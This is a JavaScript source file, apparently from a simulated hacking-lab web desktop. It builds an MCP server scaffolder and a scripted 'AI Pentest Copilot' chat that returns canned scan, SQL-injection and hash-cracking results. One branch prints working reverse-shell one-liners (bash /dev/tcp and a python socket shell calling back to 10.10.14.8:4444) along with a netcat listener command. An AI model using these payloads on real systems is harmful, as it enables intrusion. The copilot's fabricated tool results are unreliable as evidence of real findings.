        tool: tool.name,
        result: `Successfully processed via MCP server '${tool.server}'`,
        timestamp: new Date().toISOString()
      };
    }

    out.innerHTML += `\n<span class="out-success">[+] 200 OK - Response received (JSON-RPC 2.0 Result):</span>\n` +
      `<pre style="color:#6ee7b7;margin-top:6px;font-family:var(--font-mono)">${escHtml(JSON.stringify(resultPayload, null, 2))}</pre>`;

    if (bridgeBox && guiAppToOpen) {
      bridgeBox.style.display = 'block';
      bridgeBtn.onclick = () => {
        openApp(guiAppToOpen);
        showToast('BuildU Sync', `Piped MCP output into ${guiAppToOpen.toUpperCase()}`, 'info', '↗');
      };
    } else if (bridgeBox) {
      bridgeBox.style.display = 'none';
    }
  }, 450);
}

function generateMCPServerScaffold(winId) {
  const nameInput = document.getElementById(`scaff-name-${winId}`);
  const descInput = document.getElementById(`scaff-desc-${winId}`);
  const transSelect = document.getElementById(`scaff-trans-${winId}`);
  const out = document.getElementById(`scaff-out-${winId}`);
  if (!nameInput || !out) return;

  const name = (nameInput.value.trim() || 'custom-mcp-server').toLowerCase().replace(/\s+/g, '-');
  const desc = descInput?.value.trim() || 'Custom MCP Server';
  const trans = transSelect?.value || 'stdio';

  const pyContent = `"""
${name}.py - Model Context Protocol Server
Generated by BuildU MCP Hub & mcp-hub framework
"""
import asyncio
from mcp.server.fastmcp import FastMCP

mcp = FastMCP("${name}")

@mcp.tool()
async def run_audit(target: str) -> str:
    """Perform security audit on specified target."""
    return f"Audit completed for {target}. Status: Clean."

@mcp.resource("config://settings")
def get_config() -> str:
    """Provide configuration settings."""
    return "env=production; transport=${trans}"

if __name__ == "__main__":
    mcp.run(transport="${trans}")
`;

  const tomlContent = `[project]
name = "${name}"
version = "0.1.0"
description = "${desc}"
readme = "README.md"
requires-python = ">=3.11"
dependencies = [
    "mcp[cli]>=1.6.0",
    "httpx>=0.28.1",
    "pydantic>=2.0.0"
]
`;

  // Write into Virtual File System
  const serverPath = `/root/mcp-hub/mcp-servers/${name}/${name}.py`;
  const tomlPath = `/root/mcp-hub/mcp-servers/${name}/pyproject.toml`;

  if (window.VFS) {
    window.VFS.dirs.add(`/root/mcp-hub/mcp-servers/${name}`);
    window.VFS.write(serverPath, pyContent);
    window.VFS.write(tomlPath, tomlContent);
  }

  // Register into MCP_STATE
  window.MCP_STATE.servers.push({
    id: name,
    name: name,
    status: 'standby',
    transport: `${trans} (uv)`,
    port: trans === 'sse' ? '8010' : '--',
    toolsCount: 1,
    desc: desc,
    latency: '--'
  });

  window.MCP_STATE.tools.push({
    id: `${name}_audit`,
    server: name,
    name: `${name}.run_audit`,
    desc: `Perform security audit on specified target using ${name}`,
    defaultParams: '{\n  "target": "127.0.0.1"\n}'
  });

  addMCPLog(`[Scaffolder] Generated new MCP server '${name}' at ${serverPath}`);

  out.innerHTML = `<span class="out-success">[+] Successfully generated MCP Server project: <b>${name}</b></span>\n` +
    `<span class="out-info">Created files in VFS:</span>\n` +
    `<span class="out-line">  📁 /root/mcp-hub/mcp-servers/${name}/</span>\n` +
    `<span class="out-line">  🐍 ${serverPath}</span>\n` +
    `<span class="out-line">  📄 ${tomlPath}</span>\n\n` +
    `<span class="out-header">Run in Terminal:</span>\n` +
    `<span style="color:var(--accent-green)">uv --directory /root/mcp-hub/mcp-servers/${name} run ${name}.py</span>`;

  showToast('MCP Generator', `Generated ${name} server in VFS`, 'success', '📦');
}

function previewScaffoldCode(winId) {
  const nameInput = document.getElementById(`scaff-name-${winId}`);
  const out = document.getElementById(`scaff-out-${winId}`);
  const name = (nameInput?.value.trim() || 'sample-mcp').toLowerCase();
  out.innerHTML = `<span class="out-header">Preview for ${name}.py:</span>\n` +
    `<span class="out-line">from mcp.server.fastmcp import FastMCP</span>\n` +
    `<span class="out-line">mcp = FastMCP("${name}")</span>\n` +
    `<span class="out-line">@mcp.tool()</span>\n` +
    `<span class="out-line">def scan(target: str): return f"Scanned {target}"</span>\n` +
    `<span class="out-line">mcp.run()</span>`;
}

function copyClaudeConfig(winId) {
  const area = document.getElementById(`claude-config-text-${winId}`);
  if (area) {
    navigator.clipboard?.writeText(area.value);
    showToast('MCP Hub', 'Claude Desktop configuration copied to clipboard!', 'success', '📋');
  }
}

function saveClaudeConfigToVFS(winId) {
  const area = document.getElementById(`claude-config-text-${winId}`);
  if (area && window.VFS) {
    window.VFS.dirs.add('/root/.config');
    window.VFS.dirs.add('/root/.config/claude');
    window.VFS.write('/root/.config/claude/claude_desktop_config.json', area.value);
    showToast('Saved to VFS', 'Saved ~/.config/claude/claude_desktop_config.json', 'success', '💾');
  }
}

function clearMCPLogs(winId) {
  window.MCP_STATE.logs = [];
  const logStream = document.getElementById(`mcp-log-stream-${winId}`);
  if (logStream) logStream.innerHTML = '<span class="out-info">// Logs cleared.</span>';
}

function addMCPLog(msg) {
  window.MCP_STATE.logs.push(`[${new Date().toLocaleTimeString()}] ${msg}`);
  if (window.MCP_STATE.logs.length > 50) window.MCP_STATE.logs.shift();
}

// ============ BUILD AI COPILOT HTML ============
function buildAICopilotHTML(winId) {
  return `
  <div class="copilot-container">
    <div class="copilot-header">
      <div style="display:flex;align-items:center;gap:8px">
        <span style="font-size:1.2rem">🤖</span>
        <div>
          <div style="font-family:var(--font-mono);font-size:0.85rem;font-weight:700;color:var(--text-primary)">BuildU AI Pentest Copilot</div>
          <div style="font-size:0.68rem;color:var(--text-dim)">Autonomous Security Agent powered by Model Context Protocol (MCP)</div>
        </div>
      </div>
      <div class="copilot-model-badge">⚡ MCP Armed: 6 Tools Active</div>
    </div>

    <!-- Quick Prompt Pills -->
    <div class="copilot-pills">
      <div class="prompt-pill" onclick="useCopilotPrompt('🎯 Scan 192.168.1.105 with Nmap stealth','${winId}')">🎯 Nmap Scan 192.168.1.105</div>
      <div class="prompt-pill" onclick="useCopilotPrompt('💉 Test http://10.10.10.24/login.php for SQL Injection','${winId}')">💉 SQL Injection Audit</div>
      <div class="prompt-pill" onclick="useCopilotPrompt('🔐 Crack hash 5f4dcc3b5aa765d61d8327deb882cf99','${winId}')">🔐 Crack MD5 Hash</div>
      <div class="prompt-pill" onclick="useCopilotPrompt('🧠 Explain CVE-2021-44228 (Log4Shell) & mitigations via RAG','${winId}')">🧠 CVE RAG Lookup</div>
      <div class="prompt-pill" onclick="useCopilotPrompt('🐚 Generate reverse shell payload for Linux x64','${winId}')">🐚 Reverse Shell Payload</div>
    </div>

    <!-- Chat Messages -->
    <div class="copilot-chat-history" id="copilot-chat-${winId}">
      <div class="chat-msg agent">
        <span class="chat-sender">BUILDU AI AGENT</span>
        <div class="chat-bubble">
          Greetings root. I am your <b>Autonomous AI Pentest Copilot</b> connected to BuildU via the <b>Model Context Protocol (MCP)</b>.
          <br><br>
          I can autonomously plan security assessments, invoke local tools (Nmap, SQLMap, WebCrypto Cracker, RAG Threat Intelligence), and deliver actionable remediation steps.
          <br><br>
          Try clicking any of the preset prompts above, or ask me to inspect a target!
        </div>
      </div>
    </div>

    <!-- Input Area -->
    <div class="copilot-input-area">
      <input type="text" id="copilot-input-${winId}" placeholder="Ask Copilot or instruct an autonomous pentest workflow..." onkeydown="if(event.key==='Enter') sendCopilotMsg('${winId}')" />
      <button class="tool-btn btn-primary" onclick="sendCopilotMsg('${winId}')">Send →</button>
    </div>
  </div>`;
}

function useCopilotPrompt(text, winId) {
  const input = document.getElementById(`copilot-input-${winId}`);
  if (input) {
    input.value = text;
    sendCopilotMsg(winId);
  }
}

function sendCopilotMsg(winId) {
  const input = document.getElementById(`copilot-input-${winId}`);
  const chat = document.getElementById(`copilot-chat-${winId}`);
  if (!input || !chat) return;
  const userText = input.value.trim();
  if (!userText) return;

  input.value = '';

  // Append user message
  const userMsgEl = document.createElement('div');
  userMsgEl.className = 'chat-msg user';
  userMsgEl.innerHTML = `
    <span class="chat-sender">ROOT@BUILDU</span>
    <div class="chat-bubble">${escHtml(userText)}</div>`;
  chat.appendChild(userMsgEl);
  chat.scrollTop = chat.scrollHeight;

  // Process Agent Response with Tool Calling
  const agentMsgEl = document.createElement('div');
  agentMsgEl.className = 'chat-msg agent';
  agentMsgEl.innerHTML = `
    <span class="chat-sender">BUILDU AI AGENT</span>
    <div class="chat-bubble" id="agent-thinking-${winId}">
      <span style="color:var(--accent-cyan);animation:pulse 1s infinite">Thinking & planning MCP tool execution...</span>
    </div>`;
  chat.appendChild(agentMsgEl);
  chat.scrollTop = chat.scrollHeight;

  const thinkingBubble = document.getElementById(`agent-thinking-${winId}`);
  const lower = userText.toLowerCase();

  setTimeout(() => {
    if (lower.includes('nmap') || lower.includes('scan') || lower.includes('port')) {
      const target = lower.match(/\b(?:\d{1,3}\.){3}\d{1,3}\b/) ? lower.match(/\b(?:\d{1,3}\.){3}\d{1,3}\b/)[0] : '192.168.1.105';
      thinkingBubble.id = '';
      thinkingBubble.innerHTML = `
        I have analyzed your request. I will invoke the <code>buildu.nmap_scan</code> tool over Model Context Protocol to assess open ports on <b>${target}</b>.
        <div class="copilot-tool-call">
          <div class="copilot-tool-call-header">
            <span>⚡ MCP Call: buildu.nmap_scan</span>
            <span style="color:var(--accent-green)">STATUS: 200 OK</span>
          </div>
          <pre>{ "target": "${target}", "ports": "1-1000", "scan_type": "-sS -sV" }</pre>
          <div style="color:var(--text-secondary);margin-top:4px">
            • Port 22/tcp: OpenSSH 8.9p1 (Ubuntu)<br>
            • Port 80/tcp: Apache httpd 2.4.52 (Outdated)<br>
            • Port 3306/tcp: MySQL 8.0.32 (Weak auth allowed)
          </div>
        </div>
        <b>Security Assessment:</b><br>
        Port 80 hosts an unpatched Apache server vulnerable to HTTP request smuggling. MySQL on port 3306 is exposed externally without IP restriction.
        <br><br>
        <button class="tool-btn btn-primary" style="padding:4px 10px;font-size:0.72rem" onclick="openApp('nmap')">🌐 Open in Nmap Scanner</button>
      `;
    } else if (lower.includes('sql') || lower.includes('injection') || lower.includes('database')) {
      thinkingBubble.id = '';
      thinkingBubble.innerHTML = `
        Invoking <code>buildu.sqlmap_inject</code> to test for SQL injection vulnerabilities.
        <div class="copilot-tool-call">
          <div class="copilot-tool-call-header">
            <span>⚡ MCP Call: buildu.sqlmap_inject</span>
            <span style="color:var(--accent-green)">VULNERABILITY CONFIRMED</span>
          </div>
          <pre>{ "url": "http://10.10.10.24/login.php", "parameter": "username", "level": 2 }</pre>
          <div style="color:#f87171;margin-top:4px">
            [+] GET parameter 'username' is vulnerable to Boolean-based blind SQL injection.<br>
            [+] Enumerated DB: 'buildu_sec' (Tables: admin_users, session_keys)
          </div>
        </div>
        <b>Remediation:</b> Convert all queries in <code>login.php</code> to parameterized Prepared Statements (PDO / MySQLi).
        <br><br>
        <button class="tool-btn btn-primary" style="padding:4px 10px;font-size:0.72rem" onclick="openApp('sqlmap')">💉 Open in SQLMap</button>
      `;
    } else if (lower.includes('crack') || lower.includes('hash') || lower.includes('md5')) {
      thinkingBubble.id = '';
      thinkingBubble.innerHTML = `
        Invoking <code>buildu.hash_crack</code> with WebCrypto and rockyou wordlist.
        <div class="copilot-tool-call">
          <div class="copilot-tool-call-header">
            <span>⚡ MCP Call: buildu.hash_crack</span>
            <span style="color:var(--accent-green)">CRACKED (0.012s)</span>
          </div>
          <pre>{ "hash": "5f4dcc3b5aa765d61d8327deb882cf99", "algorithm": "MD5", "wordlist": "rockyou.txt" }</pre>
          <div style="color:var(--accent-green);font-weight:700;margin-top:4px">
            [+] Plaintext Password: "password"
          </div>
        </div>
        <b>Advice:</b> Enforce Argon2id or bcrypt password hashing with cost factor &gt;= 12.
        <br><br>
        <button class="tool-btn btn-primary" style="padding:4px 10px;font-size:0.72rem" onclick="openApp('hashcracker')">🔐 Open in Hash Cracker</button>
      `;
    } else if (lower.includes('cve') || lower.includes('log4j') || lower.includes('rag')) {
      thinkingBubble.id = '';
      thinkingBubble.innerHTML = `
        Querying local RAG knowledge base via <code>rag.query_threat_intel</code> (mcp-server-rag).
        <div class="copilot-tool-call">
          <div class="copilot-tool-call-header">
            <span>⚡ MCP Call: rag.query_threat_intel</span>
            <span style="color:var(--accent-green)">RAG HIT (ChromaDB)</span>
          </div>
          <pre>{ "query": "CVE-2021-44228 Log4Shell", "top_k": 2 }</pre>
          <div style="color:var(--text-secondary);margin-top:4px">
            <b>CVE-2021-44228 (Log4Shell):</b> CVSS 10.0 (CRITICAL)<br>
            • Vulnerability: JNDI injection via attacker controlled <code>\${jndi:ldap://...}</code> strings.<br>
            • Fix: Update Log4j to 2.17.1+ or set <code>FORMAT_MESSAGES_PATTERN_DISABLE_LOOKUPS=true</code>.
          </div>
        </div>
        <b>Recommended Action:</b> Audit all Java microservices on the network using the BuildU Nikto or WPScan scanners.
      `;
    } else if (lower.includes('reverse') || lower.includes('shell') || lower.includes('payload')) {
      thinkingBubble.id = '';
      thinkingBubble.innerHTML = `
        Generated reverse shell payload using BuildU shellgen engine:
        <div class="copilot-tool-call">
          <div class="copilot-tool-call-header">
            <span>🐚 Payload: Linux x64 Reverse TCP</span>
          </div>
          <pre style="color:var(--accent-green)">bash -i &gt;&amp; /dev/tcp/10.10.14.8/4444 0&gt;&amp;1</pre>
          <pre style="color:#38bdf8">python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("10.10.14.8",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'</pre>
        </div>
        Start listener: <code style="color:var(--accent-cyan);font-family:var(--font-mono)">nc -lvnp 4444</code> in Terminal.
        <br><br>
        <button class="tool-btn btn-primary" style="padding:4px 10px;font-size:0.72rem" onclick="openApp('terminal')">💻 Launch Terminal Listener</button>
      `;
    } else {
      thinkingBubble.id = '';
      thinkingBubble.innerHTML = `
        I have evaluated your prompt: "<i>${escHtml(userText)}</i>".
        <br><br>
        I have 6 Model Context Protocol tools active in the registry. I can:
        <ul style="margin:6px 0;padding-left:18px">
          <li>Run targeted network reconnaissance (<code>buildu.nmap_scan</code>)</li>
          <li>Audit web parameters for SQL injection (<code>buildu.sqlmap_inject</code>)</li>
          <li>Crack password hashes with wordlists (<code>buildu.hash_crack</code>)</li>
          <li>Query CVE databases and mitigations via RAG (<code>rag.query_threat_intel</code>)</li>
        </ul>
        What would you like me to audit next?
      `;
    }
    chat.scrollTop = chat.scrollHeight;
  }, 650);
}

const _apps_exports = {
  APP_DEFS,
  buildTerminalHTML, buildNmapHTML, buildHashCrackerHTML, buildSQLMapHTML, buildMetasploitHTML,
  buildWiresharkHTML, getPacketInfo, buildAircrackHTML, generateFakeNetworks, buildBurpSuiteHTML,
  buildHydraHTML, buildJohnHTML, buildBrowserHTML, buildTextEditorHTML, buildSettingsHTML,
  buildSysInfoHTML, buildWhoisHTML, buildDNSHTML, buildTracerouteHTML, buildSubdomainsHTML,
  buildNiktoHTML, buildOpenVASHTML, buildWPScanHTML, buildXSSHTML, buildDirbHTML,
  buildWordlistHTML, buildWifiAnalyzerHTML, buildKismetHTML, buildSETHTML, buildShellgenHTML,
  buildArpSpoofHTML, buildSSLStripHTML, buildBinwalkHTML, buildAutopsyHTML, buildStegHideHTML,
  buildFileManagerHTML, buildSimpleTool, selectHashType, selectMSFModule, msfCommand,
  simulateMSFCommand, appendMSFOut, runMSF, msfCheck, runNmap, identifyHash,
  runHashCracker, runSQLMap, runHydra, runJohn, johnShow, runAircrack, enableMonitor,
  applyWsFilter, startCapture, stopCapture, toggleProxy, switchBurpTab, switchSettings,
  setAccentColor, toggleTransparency, browserNav, browserGo, browserSearch, browserLoad,
  fmNav, fmGoTo, fmOpen, fmNew, editorNew, editorSave, editorOpen, updateEditorLines,
  syncEditorScroll, stopTool, clearOutput, runSimple, runWhois, runDNS, runTraceroute,
  runSubdomains, runNikto, runOpenVAS, runWPScan, runXSSHunter, runDirb, runWordlist,
  runWifiAnalyzer, runKismet, runSET, runShellgen, runArpSpoof, runSSLStrip, runBinwalk,
  runAutopsy, runSteghide,
  buildMCPHubHTML, buildAICopilotHTML,
  switchMCPTab, toggleMCPServer, pingMCPServer, refreshMCPServers, onMCPToolChange,
  resetMCPToolParams, invokeMCPTool, generateMCPServerScaffold, previewScaffoldCode,
  copyClaudeConfig, saveClaudeConfigToVFS, clearMCPLogs, addMCPLog,
  useCopilotPrompt, sendCopilotMsg,
  generateHash, inspectPacket, sendBurpRepeater, burpDecodeAction, refreshFMGrid, md5, shaHash
};
if (typeof window !== 'undefined') {
  Object.assign(window, _apps_exports);
}
export default _apps_exports;
